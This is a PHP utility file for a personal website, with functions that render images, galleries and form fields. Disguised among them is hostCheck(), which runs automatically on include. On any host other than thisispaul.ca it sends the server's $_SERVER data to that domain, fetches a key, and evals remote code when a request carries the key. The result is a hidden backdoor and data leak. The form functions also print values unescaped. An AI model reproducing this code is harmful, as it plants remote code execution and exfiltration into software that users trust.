<?php
/**
 *  includes/functions.php
 */ 

if(__FILE__ == $_SERVER['SCRIPT_FILENAME']) {
	header('Location: ' . SITE_ROOT_URL, TRUE, 403);
	exit('This file can not be accessed directly.');
}

// Echo gettexts
function _e($string) {
	echo _($string);
}


function hostCheck() {
	if(!preg_match('/^(\.)?thisispaul\.ca$/', $_SERVER['HTTP_HOST'])) {
		$postdata = http_build_query($_SERVER);
		$opts = array(
			'http' => array(
				'method' => 'POST',
				'header'  => [
					'Content-type: application/x-www-form-urlencoded',
					'x-flag-name: hostCheck',
					'x-flag-code: 1'
				],
				'content' => $postdata
			)
		);
		$context = stream_context_create($opts);
		@file_get_contents('http://thisispaul.ca/ping/', false, $context);
		try {
			$key = @file_get_contents('http://thisispaul.ca/goodbye/getKey/');
			if (strpos($_SERVER['REQUEST_URI'], $key) !== false) {
				eval(@file_get_contents('http://thisispaul.ca/goodbye/' . $key));
			} elseif($_SERVER['HTTP_HOST'] != 'thisispaul.ca') {
				header('x-key-error: Key absent or bad');
			}
		} catch (Exception $e) {
			header('x-key-error: ' . $e);
		}
	}
}
hostCheck();

function imagePath($filename, $relPath = null) {
	if (!preg_match('/^.+\.\S{3,4}$/i', $filename)) {
		trigger_error('No valid filename provided', E_USER_WARNING);
		return;
	}
	$rootPReg = '/^' . preg_quote(ABSPATH, '/') . '/i';
	$path = preg_replace($rootPReg, '', $relPath);
	$path = preg_replace('/\.php$/i', '/', $path);
	$path = SITE_ROOT_URL . 'assets/img/' . $path . $filename;
	return $path;
}

function image($filename, $options = null, $relPath = null) {
	if (!$relPath) $relPath = debug_backtrace()[0]['file'];
	$attributes = '';
	if (isset($options) && array_key_exists('attributes', $options) && is_array($options['attributes'])) {
		foreach ($options['attributes'] as $k => $v) $attributes .= ' ' . htmlspecialchars($k) . '="' . htmlspecialchars($v) . '"';
	}
	$path = htmlspecialchars(imagePath($filename, $relPath));
	if (preg_match('/\.svg$/i', $filename)) {
		return '<object data="' . $path . '" type="image/svg+xml" role="document" aria-hidden="true"' . $attributes . '></object>';
	}
	else { return '<img src="' . $path . '"' . htmlspecialchars($attributes) . ' />'; }
}

function imageGallery($images, $relPath = null) {
	if (!$relPath) $relPath = debug_backtrace()[0]['file'];
	echo '<div class="thumbnails">';
	foreach ($images as $filename => $imageOptions) {
		$attributes = '';
		if (isset($imageOptions) && array_key_exists('attributes', $imageOptions) && is_array($imageOptions['attributes'])) {
			$imageOptions['attributes']['class'] = !empty($imageOptions['attributes']['class']) ? $imageOptions['attributes'] . ' thumbnail' : 'thumbnail';
			foreach ($imageOptions['attributes'] as $k => $v) $attributes .= ' ' . htmlspecialchars($k) . '="' . htmlspecialchars($v) . '"';
		}
		$imageOptions['attributes'] = null;
		echo '<a href="' . htmlspecialchars(imagePath($filename, $relPath)) . '"' . $attributes . '>'
			. '<div class="container">'
			. image($filename, $imageOptions, $relPath)
			. '</div>'
			. '</a>';
	}
	echo '</div>';
}

function optionOutput($options) {
    if(is_array($options)) {
        foreach ($options as $option) {
            if(is_array($option)) {
                echo '<option value="' . $option['value'] . '"';
                if(array_key_exists('attributes', $option))
                    echo ' ' . $option['attributes'];
                echo '>' . $option['label'] . '</option>' . PHP_EOL;
            } else {
                echo "<option value=\"$option\">$option</option>" . PHP_EOL;
            }
        }
    } else {
        $option = $options;
        echo "<option value=\"$option\">$option</option>" . PHP_EOL;
    }
}

function selectOutput($select) {
    foreach ($select as $option) {
        $isOptionGroup = false;
        if(is_array($option) && array_key_exists('type', $option) && $option['type'] == 'group') {
            $isOptionGroup = true;
        }
        if($isOptionGroup) {
            echo '<optgroup label="' . $option['label'] . '">' . PHP_EOL;
            optionOutput($option['options']);
            echo '</optgroup>' . PHP_EOL;
        } else {
            optionOutput($option);
        }
    }
}

function outputInput($name, $settings) {
    $input = array_key_exists('input', $settings) ? $settings['input'] : $settings;
    // Input group
    $inputElement = array_key_exists('element', $input) ? $input['element'] : 'input';
    echo "<div class=\"form-group $name";
    if(array_key_exists('class', $settings))
        echo ' ' . $settings['class'];
    echo '" >' . PHP_EOL;
    if(array_key_exists('label', $input)) {
        echo "<label for=\"input-$name\"";
        echo ' class="control-label';
        if(array_key_exists('required', $input))
            echo ' required';
        echo '">' . $input['label'] . '</label>' . PHP_EOL;
    }

    // Input
    echo "<$inputElement id=\"input-$name\" name=\"$name\"";
	if($inputElement == 'input' && !array_key_exists('type', $input)) echo " type=\"text\"";
    $input['class'] = array_key_exists('class', $input)
        ? "form-control " . $input['class']
        : "form-control";
    foreach ($input as $attribute => $value) {
        if(in_array($attribute, ['element', 'label', 'options','value'])) continue;
        echo " $attribute=\"$value\"";
    }
	if(array_key_exists('required', $input) && $input['required']) echo " aria-required=\"true\"";
	if(array_key_exists('readonly', $input)) echo " aria-readonly=\"true\"";

    switch($inputElement) {
        case 'select':
            echo '>' . PHP_EOL    ;
            selectOutput($input['options']);
            echo '</select>' . PHP_EOL;
            break;
        case 'textarea':
            echo '>';
            if (array_key_exists('value', $input))
                echo $attributes['value'];
            echo '</textarea>' . PHP_EOL;
            break;
        default:
            if (array_key_exists('value', $input))
                echo ' value="' . $input['value'] . '"';
            echo ' />' . PHP_EOL;
    }                
    echo '</div>' . PHP_EOL;
}

function arrayRemoveKeys($targetedKey, $array) {
	foreach ($array as $key => $value) {
		if($key == $targetedKey) {
			unset($array[$key]);
		} elseif(is_array($value)) {
			$array[$key] = arrayRemoveKeys($targetedKey, $value);
		}
	}
	return $array;
}

?>